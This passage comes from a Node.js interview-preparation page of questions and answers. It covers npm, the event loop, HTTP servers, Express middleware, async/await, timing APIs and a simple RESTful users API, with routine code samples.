&lt;p&gt;It is an approach to connect the output of one stream to the input of another stream, thus creating a chain of multiple stream operations.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is a control flow function? what are the steps does it execute?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;It is a generic piece of code which runs in between several asynchronous function calls is known as control flow function.&lt;/p&gt; 
&lt;p&gt;It executes the following steps.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Control the order of execution.&lt;/li&gt; 
 &lt;li&gt;Collect data.&lt;/li&gt; 
 &lt;li&gt;Limit concurrency.&lt;/li&gt; 
 &lt;li&gt;Call the next step in the program.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is npm in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;NPM stands for Node Package Manager. It provides following two main functionalities.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;It works as an Online repository for node.js packages/modules which are present at &amp;lt;nodejs.org&amp;gt;.&lt;/li&gt; 
 &lt;li&gt;It works as Command line utility to install packages, do version management and dependency management of Node.js packages. NPM comes bundled along with Node.js installable. We can verify its version using the following command-&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm --version
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;NPM helps to install any Node.js module using the following command.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install &amp;lt;Module Name&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For example, following is the command to install a famous Node.js web framework module called express-&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install express
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;When to use Node.js and when not to use it?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;When to use Node.js&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;It is ideal to use Node.js for developing streaming or event-based real-time applications that require less CPU usage such as.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Chat applications.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Game servers -- Node.js is good for fast and high-performance servers, that face the need to handle thousands of user requests simultaneously.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Good For A Collaborative Environment -- It is suitable for environments where multiple people work together. For example, they post their documents, modify them by doing check-out and check-in of these documents. Node.js supports such situations by creating an event loop for every change made to the document. The ‚ÄúEvent loop‚Äù feature of Node.js enables it to handle multiple events simultaneously without getting blocked.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Advertisement Servers -- Here again, we have servers that handle thousands of request for downloading advertisements from a central host. And Node.js is an ideal solution to handle such tasks.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Streaming Servers -- Another ideal scenario to use Node.js is for multimedia streaming servers where clients fire request‚Äôs towards the server to download different multimedia contents from it.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;To summarize, it‚Äôs good to use Node.js, when you need high levels of concurrency but less amount of dedicated CPU time.&lt;/p&gt; 
&lt;p&gt;Last but not the least, since Node.js uses JavaScript internally, so it fits best for building client-side applications that also use JavaScript.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;When to not use Node.js&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;However, we can use Node.js for a variety of applications. But it is a single threaded framework, so we should not use it for cases where the application requires long processing time. If the server is doing some calculation, it won‚Äôt be able to process any other requests. Hence, Node.js is best when processing needs less dedicated CPU time.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Explain how does Node.js work?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;A Node.js application creates a single thread on its invocation. Whenever Node.js receives a request, it first completes its processing before moving on to the next request.&lt;/p&gt; 
&lt;p&gt;Node.js works asynchronously by using the event loop and callback functions, to handle multiple requests coming in parallel. An Event Loop is a functionality which handles and processes all your external events and just converts them to a callback function. It invokes all the event handlers at a proper time. Thus, lots of work is done on the back-end, while processing a single request, so that the new incoming request doesn‚Äôt have to wait if the processing is not complete.&lt;/p&gt; 
&lt;p&gt;While processing a request, Node.js attaches a callback function to it and moves it to the back-end. Now, whenever its response is ready, an event is called which triggers the associated callback function to send this response.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Is Node.js entirely based on a single-thread?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Yes, it is true that Node.js processes all requests on a single thread. But it is just a part of the theory behind Node.js design. In fact, more than the single thread mechanism, it makes use of events and callbacks to handle a large no. of requests asynchronously.&lt;/p&gt; 
&lt;p&gt;Moreover, Node.js has an optimized design which utilizes both JavaScript and C++ to guarantee maximum performance. JavaScript executes at the server-side by Google Chrome v8 engine. And the C++ lib UV library takes care of the non-sequential I/O via background workers.&lt;/p&gt; 
&lt;p&gt;To explain it practically, let‚Äôs assume there are 100s of requests lined up in Node.js queue. As per design, the main thread of Node.js event loop will receive all of them and forwards to background workers for execution. Once the workers finish processing requests, the registered callbacks get notified on event loop thread to pass the result back to the user.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to make post request in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Following code snippet can be used to make a Post Request in Node.js.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var request = require(&#39;request&#39;);
    request.post(&#39;http://www.example.com/action&#39;, { form: { key: &#39;value&#39; } },
    function (error, response, body) {
        if (!error &amp;amp;&amp;amp; response.statusCode == 200) {
            console.log(body)
        }
    });
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Can you create http server in Node.js, explain the code used for it?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Yes, we can create HTTP Server in Node.js. We can use the &lt;code&gt;&amp;lt;http-server&amp;gt;&lt;/code&gt; command to do so.&lt;/p&gt; 
&lt;p&gt;Following is the sample code.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var http = require(&#39;http&#39;);
var requestListener = function (request, response) {
    response.writeHead(200, {&#39;Content-Type&#39;: &#39;text/plain&#39;});
    response.end(&#39;Welcome Viewers\n&#39;);
}
var server = http.createServer(requestListener);
server.listen(4200); // The port where you want to start with.
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to load html in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;To load HTML in Node.js we have to change the ‚ÄúContent-type‚Äù in the HTML code from text/plain to text/html.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;fs.readFile(filename, &quot;binary&quot;, function(err, file) {
    if(err) { 
        response.writeHead(500, {&quot;Content-Type&quot;: &quot;text/plain&quot;});
        response.write(err + &quot;\n&quot;);
        response.end();
        return;
    }

response.writeHead(200);
response.write(file, &quot;binary&quot;);
response.end();
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Now we will modify this code to load an HTML page instead of plain text.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;fs.readFile(filename, &quot;binary&quot;, function(err, file) {
    if(err) { 
        response.writeHead(500, {&quot;Content-Type&quot;: &quot;text/html&quot;});
        response.write(err + &quot;\n&quot;);
        response.end();
        return;
    }

response.writeHead(200, {&quot;Content-Type&quot;: &quot;text/html&quot;});
response.write(file);
response.end();
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How can you listen on port 80 with Node?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Instead of running on port 80 we can redirect port 80 to your application&#39;s port (&amp;gt;1024) using&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3000
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is the difference between operational and programmer errors?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Operation errors are not bugs, but problems with the system, like request timeout or hardware failure. On the other hand programmer errors are actual bugs.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Why npm shrinkwrap is useful?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;NPM shrinkwrap lets you lock down the ver¬≠sions of installed pack¬≠ages and their descen¬≠dant pack¬≠ages. It helps you use same package versions on all environments (development, staging, production) and also improve download and installation speed. Having same versions of packages on all environments can help you test systems and deploy with confidence. If all tests pass on one machine, you can be sure that it will pass on all other because you know that you use same code!&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm shrinkwrap
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;It should create new npm-shrinkwrap.json file with information about all packages you use.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is your favourite HTTP framework and why?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Express.js&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Express provides a thin layer on top of Node.js with web application features such as basic routing, middleware, template engine and static files serving, so the drastic I/O performance of Node.js doesn‚Äôt get compromised.&lt;/p&gt; 
&lt;p&gt;Express is a minimal, un-opinionated framework. it doesn‚Äôt apply any of the prevalent design patterns such as MVC, MVP, MVVM or whatever is trending out of the box. For fans of simplicity, this is a big plus among all other frameworks because you can build your application with your own preference and no unnecessary learning curve. This is especially advantageous when creating a new personal project with no historical burden, but as the project or developing team grows, lack of standardization may lead to extra work for project/code management, and worst case scenario it may lead to the inability to maintain.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Generator&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Even though the framework is un-opinionated, it does have the generator that generates specific project folder structure. After installing express-generator npm package and creating application skeleton with generator command, an application folder with clear hierarchy will be created to help you organize images, front-end static JavaScript, stylesheet files and HTML template files.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install express-generator -g
express helloapp
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Middleware&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Middleware are basically just functions that have full access to both request and response objects.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var app = express();

app.use(cookieParser());
app.use(bodyParser());
app.use(logger());
app.use(authentication());

app.get(&#39;/&#39;, function (req, res) {
  // ...
});

app.listen(3000);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;An Express application is essentially Node.js with a host of middleware functions, whether you want to customize your own middleware or take advantage of the built-in middlewares of the framework, Express made the process natural and intuitive.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Template Engine&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Template engines allow developer to embed backend variables into HTML files, and when requested the template file will be rendered to plain HTML format with the variables interpolated with their actual values. By default, the express-generator uses Pug (originally known as Jade) template engine, but other options like Mustache and EJS also work with Express seamlessly.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Database Integration&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;As a minimal framework, Express does not consider database integration as a required aspect within its package, thus it leans toward no specific database usage whatsoever. While adopting a particular data storage technology, be it MySQL, MongoDB, PostgreSQL, Redis, ElasticSearch or something else, it‚Äôs just a matter of installing the particular npm package as database driver. These third party database drivers do not conform to unified syntax when doing CRUD instructions, which makes switching databases a big hassle and error prone.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are the Challenges with Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Challenges with Node.js Application Maintenance&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Improper maintenance of an application can result in issues related to stability or flexibility, often leading to the app&#39;s failure. If the code is not well-written or if developers use outdated tools, the performance can suffer, and users might experience more bugs and app crashes. On top of that, poor-quality code can hamper the app‚Äôs scaling capacity and the further development of the application. In the worst case scenario, it might become impossible to introduce new features without rewriting the codebase from scratch.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Extensive stack&lt;/li&gt; 
 &lt;li&gt;Technical Debt&lt;/li&gt; 
 &lt;li&gt;Scalability challanges&lt;/li&gt; 
 &lt;li&gt;Poor documentation&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;How to Deal With Maintenance Problems&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Conduct code review&lt;/li&gt; 
 &lt;li&gt;Use microservices&lt;/li&gt; 
 &lt;li&gt;Improve code quality&lt;/li&gt; 
 &lt;li&gt;Test before new feature implementation&lt;/li&gt; 
 &lt;li&gt;Improve documentation&lt;/li&gt; 
 &lt;li&gt;Update the stack&lt;/li&gt; 
 &lt;li&gt;Dig into the roots&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is the difference between Node.js vs Ajax?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;1. AJAX&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;AJAX stands for Asynchronous Javascript and XML, it‚Äôs used to allow web pages (client-side) to update asynchronously by communicating with a web server and by exchanging data. This essentially means that applications can talk to a server in the background of the application. It uses some core components to function:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;The browser &lt;code&gt;XMLHttpRequest&lt;/code&gt; object to request data from a server&lt;/li&gt; 
 &lt;li&gt;HTML/CSS to display or collect data&lt;/li&gt; 
 &lt;li&gt;DOM for dynamic display&lt;/li&gt; 
 &lt;li&gt;JSON/XML for interchanging the data&lt;/li&gt; 
 &lt;li&gt;Javascript to unify everything&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;2. Node.js&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Node.js allows the developers to develop a web application in a single language called JavaScript for both client side and server side.&lt;/p&gt; 
&lt;p&gt;Unlike the other programming languages, Node.js has its cycle of the event in the form of language which is very beneficial for high-performance and scalable application development.&lt;/p&gt; 
&lt;p&gt;It is required for those web applications where traffic rate is very high. Node.js is an event based I/O language and its response time is very high rather than the other traditional languages. It is being used by the famous websites like Linked in, Twitter and Gmail.&lt;/p&gt; 
&lt;p&gt;The runtime environment of Node.js interprets JavaScript, which is very easy and simple to understand and code. Due to this reason, even the developers find it easy going which keeps them happy and relaxed. It is pertinent for real-time collaborative apps.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How Node.js overcomes the problem of blocking of I/O operations?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Node.js solves this problem by putting the event based model at its core, using an event loop instead of threads.&lt;/p&gt; 
&lt;p&gt;Node.js uses an event loop for this. An event loop is ‚Äúan entity that handles and processes external events and converts them into callback invocations‚Äù. Whenever data is needed nodejs registers a callback and sends the operation to this event loop. Whenever the data is available the callback is called.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Mention the steps by which you can async in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;ES 2017 introduced Asynchronous functions. Async functions are essentially a cleaner way to work with asynchronous code in JavaScript.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Async/Await&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The newest way to write asynchronous code in JavaScript.&lt;/li&gt; 
 &lt;li&gt;It is non blocking (just like promises and callbacks).&lt;/li&gt; 
 &lt;li&gt;Async/Await was created to simplify the process of working with and writing chained promises.&lt;/li&gt; 
 &lt;li&gt;Async functions return a Promise. If the function throws an error, the Promise will be rejected. If the function returns a value, the Promise will be resolved.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Syntax&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;// Normal Function
function add(x,y){
  return x + y;
}
// Async Function
async function add(x,y){
  return x + y;
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Await&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Async functions can make use of the await expression. This will pause the async function and wait for the Promise to resolve prior to moving on.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;function doubleAfter2Seconds(x) {
  return new Promise(resolve =&amp;gt; {
    setTimeout(() =&amp;gt; {
      resolve(x * 2);
    }, 2000);
  });
}

async function addAsync(x) {
  const a = await doubleAfter2Seconds(10);
  const b = await doubleAfter2Seconds(20);
  const c = await doubleAfter2Seconds(30);
  return x + a + b + c;
}


addAsync(10).then((sum) =&amp;gt; {
  console.log(sum);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are the timing features of Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The Performance Timing API provides an implementation of the W3C Performance Timeline specification. The purpose of the API is to support collection of high resolution performance metrics. This is the same Performance API as implemented in modern Web browsers.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const { PerformanceObserver, performance } = require(&#39;perf_hooks&#39;);

const obs = new PerformanceObserver((items) =&amp;gt; {
  console.log(items.getEntries()[0].duration);
  performance.clearMarks();
});
obs.observe({ entryTypes: [&#39;measure&#39;] });

performance.mark(&#39;A&#39;);
doSomeLongRunningProcess(() =&amp;gt; {
  performance.mark(&#39;B&#39;);
  performance.measure(&#39;A to B&#39;, &#39;A&#39;, &#39;B&#39;);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;&lt;code&gt;request&lt;/code&gt; module&lt;/strong&gt;&lt;br&gt; The popular request module has a built-in method to measure HTTP timings. You can enable it with the time property.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const request = require(&#39;request&#39;)

request({
  uri: &#39;https://nodejs.org&#39;,
  method: &#39;GET&#39;,
  time: true
}, (err, resp) =&amp;gt; {
  console.log(err || resp.timings)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is LTS releases of Node.js why should you care?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;An LTS(Long Term Support) version of Node.js receives all the critical bug fixes, security updates and performance&lt;/p&gt; 
&lt;p&gt;LTS versions of Node.js are supported for at least 18 months and are indicated by even version numbers (e.g. 4, 6, 8). They‚Äôre best for production since the LTS release line is focussed on stability and security, whereas the Current release line has a shorter lifespan and more frequent updates to the code. Changes to LTS versions are limited to bug fixes for stability, security updates, possible npm updates, documentation updates and certain performance improvements that can be demonstrated to not break existing applications.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Why should you separate Express &#39;app&#39; and &#39;server&#39;?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Keeping the API declaration separated from the network related configuration (port, protocol, etc) allows testing the API in-process, without performing network calls, with all the benefits that it brings to the table: fast testing execution and getting coverage metrics of the code. It also allows deploying the same API under flexible and different network conditions. Bonus: better separation of concerns and cleaner code.&lt;/p&gt; 
&lt;p&gt;API declaration, should reside in app.js:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var app = express();
app.use(bodyParser.json());
app.use(&quot;/api/events&quot;, events.API);
app.use(&quot;/api/forms&quot;, forms);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Server network declaration, should reside in /bin/www:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var app = require(&#39;../app&#39;);
var http = require(&#39;http&#39;);

/**
 * Get port from environment and store in Express.
 */

var port = normalizePort(process.env.PORT || &#39;3000&#39;);
app.set(&#39;port&#39;, port);

/**
 * Create HTTP server.
 */

var server = http.createServer(app);
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is the difference between process.nextTick() and setImmediate()?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The difference between &lt;code&gt;process.nextTick()&lt;/code&gt; and &lt;code&gt;setImmediate()&lt;/code&gt; is that &lt;code&gt;process.nextTick()&lt;/code&gt; defers the execution of an action till the next pass around the event loop or it simply calls the callback function once the ongoing execution of the event loop is finished whereas &lt;code&gt;setImmediate()&lt;/code&gt; executes a callback on the next cycle of the event loop and it gives back to the event loop for executing any I/O operations.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is difference between JavaScript and Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;| |JavaScript |Node JS | |-------|-----------|-----------| |Type |JavaScript is a programming language. It running in any web browser with a proper browser engine.| It is an interpreter and environment for JavaScript with some specific useful libraries which JavaScript programming can use separately.| |Utility |Mainly using for any client-side activity for a web application, like possible attribute validation or refreshing the page in a specific interval or provide some dynamic changes in web pages without refreshing the page.| It mainly used for accessing or performing any non-blocking operation of any operating system, like creating or executing a shell script or accessing any hardware specific information or running any backend job.| |Running Engine| JavaScript running any engine like Spider monkey (FireFox), JavaScript Core (Safari), V8 (Google Chrome).| Node JS only run in a V8 engine which mainly used by google chrome. And javascript program which will be written under this Node JS will be always run in V8 Engine.|&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are the difference between Events and Callbacks?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Node.js is a single-threaded application, but it support concurrency via the concept of &lt;strong&gt;event&lt;/strong&gt; and &lt;strong&gt;callbacks&lt;/strong&gt;. Every API of Node.js is asynchronous and being single-threaded, they use async function calls to maintain concurrency. Node thread keeps an event loop and whenever a task gets completed, it fires the corresponding event which signals the event-listener function to execute.&lt;/p&gt; 
&lt;p&gt;callback functions are called when an asynchronous function returns its result, whereas event handling works on the &lt;strong&gt;observer pattern&lt;/strong&gt;. The functions that listen to events act as Observers. Whenever an event gets fired, its listener function starts executing. Node.js has multiple in-built events available through events module and EventEmitter class which are used to bind events and event-listeners&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;1. Callback&lt;/strong&gt;: A callback function is a function passed into another function as an argument, which is then invoked inside the outer function to complete some kind of routine or action.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;: synchronous callback&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function greeting(name) {
  alert(&#39;Hello &#39; + name);
}

function processUserInput(callback) {
  var name = prompt(&#39;Please enter your name.&#39;);
  callback(name);
}

processUserInput(greeting);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;2. Events&lt;/strong&gt;: Every action on a computer is an event. Node.js allows us to create and handle custom events easily by using events module. Event module includes &lt;code&gt;EventEmitter&lt;/code&gt; class which can be used to raise and handle custom events.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var event = require(&#39;events&#39;);  
var eventEmitter = new event.EventEmitter();  
  
//  Add listener function for Sum event  
eventEmitter.on(&#39;Sum&#39;, function(num1, num2) {  
    console.log(&#39;Total: &#39; + (Number(num1) + Number(num2)));  
});  

//  Call Event.  
eventEmitter.emit(&#39;Sum&#39;, &#39;10&#39;, &#39;20&#39;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Explain RESTful Web Services in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;REST stands for REpresentational State Transfer. REST is web standards based architecture and uses HTTP Protocol. It is an architectural style as well as an approach for communications purposes that is often used in various web services development. A REST Server simply provides access to resources and REST client accesses and modifies the resources using HTTP protocol.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;HTTP methods&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;GET&lt;/code&gt; ‚àí Provides read-only access to a resource.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;PUT&lt;/code&gt; ‚àí Creates a new resource.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;DELETE&lt;/code&gt; ‚àí Removes a resource.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;POST&lt;/code&gt; ‚àí Updates an existing resource or creates a new resource.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;PATCH&lt;/code&gt;‚àí Update/modify a resource&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Principles of REST&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Uniform Interface&lt;/li&gt; 
 &lt;li&gt;Stateless&lt;/li&gt; 
 &lt;li&gt;Cacheable&lt;/li&gt; 
 &lt;li&gt;Client-Server&lt;/li&gt; 
 &lt;li&gt;Layered System&lt;/li&gt; 
 &lt;li&gt;Code on Demand (optional)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;users.json&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
   &quot;user1&quot; : {
      &quot;id&quot;: 1,
      &quot;name&quot; : &quot;Ehsan Philip&quot;,
      &quot;age&quot; : 24
   },

   &quot;user2&quot; : {
      &quot;id&quot;: 2,
      &quot;name&quot; : &quot;Karim Jimenez&quot;,
      &quot;age&quot; : 22
   },

   &quot;user3&quot; : {
      &quot;id&quot;: 3,
      &quot;name&quot; : &quot;Giacomo Weir&quot;,
      &quot;age&quot; : 18
   }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;List Users&lt;/strong&gt; ( &lt;code&gt;GET&lt;/code&gt; method)&lt;/p&gt; 
&lt;p&gt;Let&#39;s implement our first RESTful API listUsers using the following code in a server.js file ‚àí&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;);
var app = express();
var fs = require(&quot;fs&quot;);

app.get(&#39;/listUsers&#39;, function (req, res) {
   fs.readFile( __dirname + &quot;/&quot; + &quot;users.json&quot;, &#39;utf8&#39;, function (err, data) {
      console.log( data );
      res.end( data );
   });
})

var server = app.listen(3000, function () {
   var host = server.address().address
   var port = server.address().port
   console.log(&quot;App listening at http://%s:%s&quot;, host, port)
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Add User&lt;/strong&gt; ( &lt;code&gt;POST&lt;/code&gt; method )&lt;/p&gt; 
&lt;p&gt;Following API will show you how to add new user in the list.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;);
var app = express();
var fs = require(&quot;fs&quot;);

var user = {
   &quot;user4&quot; : {
      &quot;id&quot;: 4,
      &quot;name&quot; : &quot;Spencer Amos&quot;,
      &quot;age&quot; : 28
   }
}

app.post(&#39;/addUser&#39;, function (req, res) {
   // First read existing users.
   fs.readFile( __dirname + &quot;/&quot; + &quot;users.json&quot;, &#39;utf8&#39;, function (err, data) {
      data = JSON.parse( data );
      data[&quot;user4&quot;] = user[&quot;user4&quot;];
      console.log( data );
      res.end( JSON.stringify(data));
   });
})

var server = app.listen(3000, function () {
   var host = server.address().address
   var port = server.address().port
   console.log(&quot;App listening at http://%s:%s&quot;, host, port)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Delete User&lt;/strong&gt;&lt;/p&gt; 
